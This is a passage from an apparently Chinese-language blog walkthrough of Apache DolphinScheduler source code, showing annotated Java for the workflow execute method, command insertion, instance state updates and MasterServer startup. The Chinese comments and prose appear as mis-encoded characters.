ExecService</strong></p><p><strong>DS</strong></p><p><strong>ä¸‹é¢çœ‹çœ‹é‡Œé¢çš„executeæ–¹æ³•ï¼Œå·²ç»åŠ å¥½äº†æ³¨é‡Šï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ“ä½œå·¥ä½œæµå®ä¾‹</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> loginUser         ç™»å½•ç”¨æˆ·</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> projectCode       é¡¹ç›®ç¼–ç </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> processInstanceId æµç¨‹å®ä¾‹ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> executeType       æ‰§è¡Œç±»å‹ï¼ˆrepeat runningã€resume pauseã€resume failureã€stopã€pauseï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> æ‰§è¡Œç»“æœ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">execute</span><span class="params">(User loginUser, <span class="type">long</span> projectCode, Integer processInstanceId, ExecuteType executeType)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** æŸ¥è¯¢é¡¹ç›®ä¿¡æ¯ **/</span></span><br><span class="line">    <span class="type">Project</span> <span class="variable">project</span> <span class="operator">=</span> projectMapper.queryByCode(projectCode);</span><br><span class="line"><span class="comment">//check user access for project</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*** åˆ¤æ–­å½“å‰ç”¨æˆ·æ˜¯å¦æœ‰æ“ä½œæƒé™ **/</span></span><br><span class="line">    Map&lt;String, Object&gt; result = projectService.checkProjectAndAuth(loginUser, project, projectCode, ApiFuncIdentificationConstant.map.get(executeType));</span><br><span class="line">    <span class="keyword">if</span> (result.get(Constants.STATUS) != Status.SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** æ£€æŸ¥MasterèŠ‚ç‚¹æ˜¯å¦å­˜åœ¨ **/</span></span><br><span class="line">    <span class="keyword">if</span> (!checkMasterExists(result)) &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** æŸ¥è¯¢å·¥ä½œæµå®ä¾‹è¯¦æƒ… **/</span></span><br><span class="line">    <span class="type">ProcessInstance</span> <span class="variable">processInstance</span> <span class="operator">=</span> processService.findProcessInstanceDetailById(processInstanceId);</span><br><span class="line">    <span class="keyword">if</span> (processInstance == <span class="literal">null</span>) &#123;</span><br><span class="line">        putMsg(result, Status.PROCESS_INSTANCE_NOT_EXIST, processInstanceId);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** æ ¹æ®å·¥ä½œæµå®ä¾‹ç»‘å®šçš„æµç¨‹å®šä¹‰IDæŸ¥è¯¢æµç¨‹å®šä¹‰ **/</span></span><br><span class="line">    <span class="type">ProcessDefinition</span> <span class="variable">processDefinition</span> <span class="operator">=</span> processService.findProcessDefinition(processInstance.getProcessDefinitionCode(),</span><br><span class="line">            processInstance.getProcessDefinitionVersion());</span><br><span class="line">    <span class="keyword">if</span> (executeType != ExecuteType.STOP &amp;&amp; executeType != ExecuteType.PAUSE) &#123;</span><br><span class="line"><span class="comment">/*** æ ¡éªŒå·¥ä½œæµå®šä¹‰èƒ½å¦æ‰§è¡Œï¼ˆå·¥ä½œæµæ˜¯å¦å­˜åœ¨ï¼Ÿæ˜¯å¦ä¸Šçº¿çŠ¶æ€ï¼Ÿå­˜åœ¨å­å·¥ä½œæµå®šä¹‰ä¸æ˜¯ä¸Šçº¿çŠ¶æ€ï¼Ÿï¼‰ **/</span></span><br><span class="line">        result = checkProcessDefinitionValid(projectCode, processDefinition, processInstance.getProcessDefinitionCode(), processInstance.getProcessDefinitionVersion());</span><br><span class="line">        <span class="keyword">if</span> (result.get(Constants.STATUS) != Status.SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** æ ¹æ®å½“å‰å·¥ä½œæµå®ä¾‹çš„çŠ¶æ€åˆ¤æ–­èƒ½å¦æ‰§è¡Œå¯¹åº”executeTypeç±»å‹çš„æ“ä½œ **/</span></span><br><span class="line">    result = checkExecuteType(processInstance, executeType);</span><br><span class="line">    <span class="keyword">if</span> (result.get(Constants.STATUS) != Status.SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** åˆ¤æ–­æ˜¯å¦å·²ç»é€‰æ‹©äº†åˆé€‚çš„ç§Ÿæˆ· **/</span></span><br><span class="line">    <span class="keyword">if</span> (!checkTenantSuitable(processDefinition)) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;there is not any valid tenant for the process definition: id:&#123;&#125;,name:&#123;&#125;, &quot;</span>,</span><br><span class="line">                processDefinition.getId(), processDefinition.getName());</span><br><span class="line">        putMsg(result, Status.TENANT_NOT_SUITABLE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** åœ¨executeTypeä¸ºé‡è·‘çš„çŠ¶æ€ä¸‹ï¼Œè·å–ç”¨æˆ·æŒ‡å®šçš„å¯åŠ¨å‚æ•° **/</span></span><br><span class="line">    Map&lt;String, Object&gt; commandMap = JSONUtils.parseObject(processInstance.getCommandParam(), <span class="keyword">new</span> <span class="title class_">TypeReference</span>&lt;Map&lt;String, Object&gt;&gt;() &#123;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="type">String</span> <span class="variable">startParams</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (MapUtils.isNotEmpty(commandMap) &amp;&amp; executeType == ExecuteType.REPEAT_RUNNING) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">startParamsJson</span> <span class="operator">=</span> commandMap.get(Constants.CMD_PARAM_START_PARAMS);</span><br><span class="line">        <span class="keyword">if</span> (startParamsJson != <span class="literal">null</span>) &#123;</span><br><span class="line">            startParams = startParamsJson.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** æ ¹æ®ä¸åŒçš„ExecuteTypeå»æ‰§è¡Œç›¸åº”çš„æ“ä½œ **/</span></span><br><span class="line">    <span class="keyword">switch</span> (executeType) &#123;</span><br><span class="line">        <span class="keyword">case</span> REPEAT_RUNNING:<span class="comment">// é‡è·‘</span></span><br><span class="line">            result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.REPEAT_RUNNING, startParams);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> RECOVER_SUSPENDED_PROCESS:<span class="comment">// æ¢å¤æŒ‚è½½çš„å·¥ä½œæµ</span></span><br><span class="line">            result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.RECOVER_SUSPENDED_PROCESS, startParams);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> START_FAILURE_TASK_PROCESS:<span class="comment">// å¯åŠ¨å¤±è´¥çš„å·¥ä½œæµ</span></span><br><span class="line">            result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.START_FAILURE_TASK_PROCESS, startParams);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> STOP:<span class="comment">// åœæ­¢</span></span><br><span class="line">            <span class="keyword">if</span> (processInstance.getState() == ExecutionStatus.READY_STOP) &#123;</span><br><span class="line">                putMsg(result, Status.PROCESS_INSTANCE_ALREADY_CHANGED, processInstance.getName(), processInstance.getState());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = updateProcessInstancePrepare(processInstance, CommandType.STOP, ExecutionStatus.READY_STOP);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> PAUSE:<span class="comment">// æš‚åœ</span></span><br><span class="line">            <span class="keyword">if</span> (processInstance.getState() == ExecutionStatus.READY_PAUSE) &#123;</span><br><span class="line">                putMsg(result, Status.PROCESS_INSTANCE_ALREADY_CHANGED, processInstance.getName(), processInstance.getState());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = updateProcessInstancePrepare(processInstance, CommandType.PAUSE, ExecutionStatus.READY_PAUSE);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            logger.error(<span class="string">&quot;unknown execute type : &#123;&#125;&quot;</span>, executeType);</span><br><span class="line">            putMsg(result, Status.REQUEST_PARAMS_NOT_VALID_ERROR, <span class="string">&quot;unknown execute type&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œä»¥ä¸Šä»£ç å‰åŠéƒ¨åˆ†ä¸»è¦æ˜¯åšäº†æ ¡éªŒçš„æ“ä½œï¼ŒååŠéƒ¨åˆ†æ˜¯æ ¹æ®æ‰§è¡Œç±»å‹æ¥åšä¸åŒçš„æ“ä½œï¼Œ<strong>æ“ä½œä¸»è¦åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šinsertCommandä»¥åŠupdateProcessInstancePrepare</strong>ã€‚</p><p><a href="https://www.notion.so/execute-58f6ea28eb7f4d4cb8f6ee64c614f670?pvs=21">executeæ‰§è¡Œæ¥å£åˆ†æ</a></p><p><strong>3.2.1 insertCommand</strong></p><p><strong>DS</strong></p><p>æ–¹æ³•ä»£ç å¦‚ä¸‹ï¼Œ<strong>å…¶å®ä¸»è¦å°±æ˜¯æŠŠç”Ÿæˆå‘½ä»¤å¹¶æ’å…¥t_ds_commandï¼ˆæ‰§è¡Œå‘½ä»¤è¡¨ï¼‰</strong>ï¼Œæ’å…¥å·²ç»æ·»åŠ å¥½æ³¨é‡Šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ’å…¥å‘½ä»¤ï¼ˆre run, recovery (pause / failure) execution)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> loginUser Â  Â  Â  Â  Â  Â  ç™»å½•ç”¨æˆ·</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> instanceId Â  Â  Â  Â  Â  Â å·¥ä½œæµå®ä¾‹id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> processDefinitionCode å·¥ä½œæµå®šä¹‰id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> processVersion Â  Â  Â  Â å·¥ä½œæµç‰ˆæœ¬</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> commandType Â  Â  Â  Â  Â  å‘½ä»¤ç±»å‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> æ“ä½œç»“æœ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Map&lt;String, Object&gt; <span class="title function_">insertCommand</span><span class="params">(User loginUser, Integer instanceId, <span class="type">long</span> processDefinitionCode, <span class="type">int</span> processVersion, CommandType commandType, String startParams)</span> &#123;</span><br><span class="line"> Â  Â Map&lt;String, Object&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** å°è£…å¯åŠ¨å‚æ•° **/</span></span><br><span class="line"> Â  Â Map&lt;String, Object&gt; cmdParam = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"> Â  Â cmdParam.put(CMD_PARAM_RECOVER_PROCESS_ID_STRING, instanceId);</span><br><span class="line"> Â  Â <span class="keyword">if</span> (!StringUtils.isEmpty(startParams)) &#123;</span><br><span class="line"> Â  Â  Â  Â cmdParam.put(CMD_PARAM_START_PARAMS, startParams);</span><br><span class="line"> Â  Â &#125;</span><br><span class="line"></span><br><span class="line"> Â  Â <span class="type">Command</span> <span class="variable">command</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Command</span>();</span><br><span class="line"> Â  Â command.setCommandType(commandType);</span><br><span class="line"> Â  Â command.setProcessDefinitionCode(processDefinitionCode);</span><br><span class="line"> Â  Â command.setCommandParam(JSONUtils.toJsonString(cmdParam));</span><br><span class="line"> Â  Â command.setExecutorId(loginUser.getId());</span><br><span class="line"> Â  Â command.setProcessDefinitionVersion(processVersion);</span><br><span class="line"> Â  Â command.setProcessInstanceId(instanceId);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** åˆ¤æ–­å·¥ä½œæµå®ä¾‹æ˜¯å¦æ­£åœ¨æ‰§è¡Œ **/</span></span><br><span class="line"> Â  Â <span class="keyword">if</span> (!processService.verifyIsNeedCreateCommand(command)) &#123;</span><br><span class="line"> Â  Â  Â  Â putMsg(result, Status.PROCESS_INSTANCE_EXECUTING_COMMAND, String.valueOf(processDefinitionCode));</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> result;</span><br><span class="line"> Â  Â &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** ä¿å­˜å‘½ä»¤ **/</span></span><br><span class="line"> Â  Â <span class="type">int</span> <span class="variable">create</span> <span class="operator">=</span> processService.createCommand(command);</span><br><span class="line"></span><br><span class="line"> Â  Â <span class="keyword">if</span> (create &gt; <span class="number">0</span>) &#123;</span><br><span class="line"> Â  Â  Â  Â putMsg(result, Status.SUCCESS);</span><br><span class="line"> Â  Â &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> Â  Â  Â  Â putMsg(result, Status.EXECUTE_PROCESS_INSTANCE_ERROR);</span><br><span class="line"> Â  Â &#125;</span><br><span class="line"></span><br><span class="line"> Â  Â <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3.2.2 updateProcessInstancePrepare</strong></p><p><strong>DS</strong></p><p>æ–¹æ³•ä»£ç å¦‚ä¸‹ï¼Œå·²ç»æ·»åŠ æ³¨é‡Š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å‡†å¤‡æ›´æ–°å·¥ä½œæµå®ä¾‹çš„å‘½ä»¤ç±»å‹å’ŒçŠ¶æ€</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> processInstance å·¥ä½œæµå®ä¾‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> commandType     å‘½ä»¤ç±»å‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> executionStatus æ‰§è¡ŒçŠ¶æ€</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> æ›´æ–°ç»“æœ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Map&lt;String, Object&gt; <span class="title function_">updateProcessInstancePrepare</span><span class="params">(ProcessInstance processInstance, CommandType commandType, ExecutionStatus executionStatus)</span> &#123;</span><br><span class="line">    Map&lt;String, Object&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    processInstance.setCommandType(commandType);</span><br><span class="line">    processInstance.addHistoryCmd(commandType);</span><br><span class="line">    processInstance.setState(executionStatus);</span><br><span class="line">    <span class="type">int</span> <span class="variable">update</span> <span class="operator">=</span> processService.updateProcessInstance(processInstance);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ¤æ–­æµç¨‹æ˜¯å¦æ­£å¸¸</span></span><br><span class="line">    <span class="keyword">if</span> (update &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">StateEventChangeCommand</span> <span class="variable">stateEventChangeCommand</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StateEventChangeCommand</span>(</span><br><span class="line">                processInstance.getId(), <span class="number">0</span>, processInstance.getState(), processInstance.getId(), <span class="number">0</span></span><br><span class="line">        );</span><br><span class="line">        <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Host</span>(processInstance.getHost());</span><br><span class="line">        stateEventCallbackService.sendResult(host, stateEventChangeCommand.convert2Command());</span><br><span class="line">        putMsg(result, Status.SUCCESS);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        putMsg(result, Status.EXECUTE_PROCESS_INSTANCE_ERROR);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ ¹æ®æµç¨‹å›¾ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°äº†å·²ç»æ‰§è¡Œäº†å¦‚ä¸‹çº¢æ¡†çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯æŠŠæˆ‘ä»¬çš„<strong>commandå·²ç»ç¼“å­˜åˆ°äº†DBã€‚</strong></p><p>æ¥ä¸‹æ¥éœ€è¦çœ‹çœ‹Masterçš„ä»£ç ã€‚</p><p><img src="/images/image7.png" alt="Alt 7"></p><p><strong>3.3 MasterServer</strong></p><p><strong>DS</strong></p><p><img src="/images/image8.png" alt="Alt 8"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;org.apache.dolphinscheduler&quot;)</span></span><br><span class="line"><span class="meta">@EnableTransactionManagement</span></span><br><span class="line"><span class="meta">@EnableCaching</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MasterServer</span> <span class="keyword">implements</span> <span class="title class_">IStoppable</span> &#123;</span><br><span class="line"> Â  Â <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(MasterServer.class);</span><br><span class="line"></span><br><span class="line"> Â  Â <span class="meta">@Autowired</span></span><br><span class="line"> Â  Â <span class="keyword">private</span> SpringApplicationContext springApplicationContext;</span><br><span class="line"></span><br><span class="line"> Â  Â <span class="meta">@Autowired</span></span><br><span class="line"> Â  Â <span class="keyword">private</span> MasterRegistryClient masterRegistryClient;</span><br><span class="line"></span><br><span class="line"> Â  Â <span class="meta">@Autowired</span></span><br><span class="line"> Â  Â <span class="keyword">private</span> TaskPluginManager taskPluginManager;</span><br><span class="line"></span><br><span class="line"> Â  Â <span class="meta">@Autowired</span></span><br><span class="line"> Â  Â <span class="keyword">private</span> MasterSchedulerService masterSchedulerService;</span><br><span class="line"></span><br><span class="line"> Â  Â <span class="meta">@Autowired</span></span><br><span class="line"> Â  Â <span class="keyword">private</span> SchedulerApi schedulerApi;</span><br><span class="line"></span><br><span class="line"> Â  Â <span class="meta">@Autowired</span></span><br><span class="line"> Â  Â <span class="keyword">private</span> EventExecuteService eventExecuteService;</span><br><span class="line"></span><br><span class="line"> Â  Â <span class="meta">@Autowired</span></span><br><span class="line"> Â  Â <span class="keyword">private</span> FailoverExecuteThread failoverExecuteThread;</span><br><span class="line"></span><br><span class="line"> Â  Â <span class="meta">@Autowired</span></span><br><span class="line"> Â  Â <span class="keyword">private</span> MasterRPCServer masterRPCServer;</span><br><span class="line"></span><br><span class="line"> Â  Â <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> Â  Â  Â  Â Thread.currentThread().setName(Constants.THREAD_NAME_MASTER_SERVER);</span><br><span class="line"> Â  Â  Â  Â SpringApplication.run(MasterServer.class);</span><br><span class="line"> Â  Â &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> Â  Â  * å¯åŠ¨ master server</span></span><br><span class="line"><span class="comment"> Â  Â  */</span></span><br><span class="line"> Â  Â <span class="meta">@PostConstruct</span></span><br><span class="line"> Â  Â <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> SchedulerException &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆå§‹åŒ– RPCæœåŠ¡</span></span><br><span class="line"> Â  Â  Â  Â <span class="built_in">this</span>.masterRPCServer.start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®‰è£…ä»»åŠ¡æ’ä»¶</span></span><br><span class="line"> Â  Â  Â  Â <span class="built_in">this</span>.taskPluginManager.installPlugin();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** MasterServer æ³¨å†Œå®¢æˆ·ç«¯ï¼Œç”¨äºè¿æ¥åˆ°æ³¨å†Œè¡¨å¹¶ä¼ é€’æ³¨å†Œè¡¨äº‹ä»¶ã€‚</span></span><br><span class="line"><span class="comment"> Â  Â  Â  Â  * å½“ä¸»èŠ‚ç‚¹å¯åŠ¨æ—¶ï¼Œå®ƒå°†åœ¨æ³¨å†Œä¸­å¿ƒæ³¨å†Œ,å¹¶è°ƒåº¦ä¸€ä¸ª&#123;<span class="doctag">@link</span> HeartBeatTask&#125;æ¥æ›´æ–°æ³¨å†Œè¡¨ä¸­çš„å…ƒæ•°æ®**/</span></span><br><span class="line"> Â  Â  Â  Â <span class="built_in">this</span>.masterRegistryClient.init();</span><br><span class="line"> Â  Â  Â  Â <span class="built_in">this</span>.masterRegistryClient.start();</span><br><span class="line"> Â  Â  Â  Â <span class="built_in">this</span>.masterRegistryClient.setRegistryStoppable(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸»è°ƒåº¦ç¨‹åºçº¿ç¨‹ï¼Œè¯¥çº¿ç¨‹å°†ä½¿ç”¨æ¥è‡ªæ•°æ®åº“çš„å‘½ä»¤å¹¶è§¦å‘æ‰§è¡Œçš„processInstanceã€‚</span></span><br><span class="line"> Â  Â  Â  Â <span class="built_in">this</span>.masterSchedulerService.init();</span><br><span class="line"> Â  Â  Â  Â <span class="built_in">this</span>.masterSchedulerService.start();</span><br><span class="line"></span><br><span class="line"> Â  Â  Â  Â <span class="built_in">this</span>.eventExecuteService.start();</span><br><span class="line"> Â  Â  Â  Â <span class="built_in">this</span>.failoverExecuteThread.start();</span><br><span class="line"></span><br><span class="line"><span 